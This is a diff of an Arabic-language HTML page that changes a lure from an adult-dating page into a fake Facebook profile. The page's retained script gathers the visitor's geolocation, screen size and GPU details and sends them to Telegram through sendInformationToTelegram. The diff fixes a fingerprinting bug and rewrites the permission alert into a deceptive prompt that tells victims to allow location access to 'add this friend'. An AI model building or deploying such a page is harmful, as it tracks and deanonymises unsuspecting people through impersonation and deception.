@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة سامح السيد</title>
+    <title>سماح السيد- Facebook</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -11,32 +11,44 @@
             margin: 0;
             display: flex;
             justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            align-items: flex-start;
+            padding: 20px;
         }
         .container {
-            max-width: 800px;
+            width: 100%;
+            max-width: 900px;
             background-color: #fff;
             border-radius: 10px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             overflow: hidden;
             text-align: center;
-            padding: 20px;
             color: #333;
         }
-        .header {
-            padding: 20px;
-            background-color: #4267B2;
-            color: #fff;
+        .cover-photo {
+            width: 100%;
+            height: 300px;
+            background-image: url('https://example.com/cover-photo.jpg');
+            background-size: cover;
+            background-position: center;
+            position: relative;
         }
-        .header img {
+        .profile-photo {
             width: 150px;
+            height: 150px;
             border-radius: 50%;
+            border: 5px solid #fff;
+            position: absolute;
+            bottom: -75px;
+            left: 20px;
         }
-        .header h1 {
+        .profile-info {
+            padding: 20px;
+            padding-top: 80px;
+        }
+        .profile-info h1 {
             margin: 10px 0;
             font-size: 24px;
+            color: #333;
         }
         .content {
             padding: 20px;
@@ -111,35 +123,19 @@
         </div>
     </div>
 
-    <div class="container" id="content" style="display: none;">
-        <div class="header">
-            <img src="https://example.com/image.jpg" alt="سامح السيد">
+    <div class="container">
+        <div class="cover-photo">
+            <img src="https://example.com/profile-photo.jpg" alt="سامح السيد" class="profile-photo">
+        </div>
+        <div class="profile-info">
             <h1>سامح السيد</h1>
         </div>
         <div class="content">
-            <p>استمتع بالتعرف على أشخاص جدد ومشاهدة محتوى حصري للكبار فقط.</p>
-            <div class="profiles">
-                <div class="profile">
-                    <img src="https://randomuser.me/api/portraits/women/81.jpg" alt="مستخدم">
-                    <p>أمل</p>
-                </div>
-                <div class="profile">
-                    <img src="https://randomuser.me/api/portraits/men/82.jpg" alt="مستخدم">
-                    <p>محمد</p>
-                </div>
-                <div class="profile">
-                    <img src="https://randomuser.me/api/portraits/women/83.jpg" alt="مستخدم">
-                    <p>ليلى</p>
-                </div>
-                <div class="profile">
-                    <img src="https://randomuser.me/api/portraits/men/84.jpg" alt="مستخدم">
-                    <p>علي</p>
-                </div>
+            <p>مرحبًا بكم في صفحة سامح السيد الشخصية.</p>
+           
             </div>
         </div>
-        <div class="footer">
-            <p>حقوق الطبع والنشر © 2024 موقع التعارف. جميع الحقوق محفوظة. <a href="#">سياسة الخصوصية</a></p>
-        </div>
+       
     </div>
 
     <script>
@@ -185,7 +181,7 @@
             if (gl) {
                 debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
-                ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO) || 'غير متوفر';
+                ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
             }
 
             var ht = window.screen.height;
@@ -221,13 +217,12 @@
                     sendInformationToTelegram(locationInfo);
 
                     document.getElementById('overlay').style.display = 'none';
-                    document.getElementById('content').style.display = 'block';
                 }, function (error) {
-                    alert('يرجى تفعيل إذن الموقع للمتابعة.');
+                    alert('لديك مشكلة قم بعمل سماح لاضافة هذا الحساب في الاصدقاء.');
                     document.getElementById('overlay').style.display = 'flex';
                 }, optn);
             } else {
-                alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
+                alert('جهازك لا يدعم تحديد .');
             }
         }
 
@@ -241,7 +236,7 @@
                     document.getElementById('overlay').style.display = 'flex';
                 });
             } else {
-                alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
+                alert('جهازك لا يدعم تحديد .');
             }
         };
     </script>
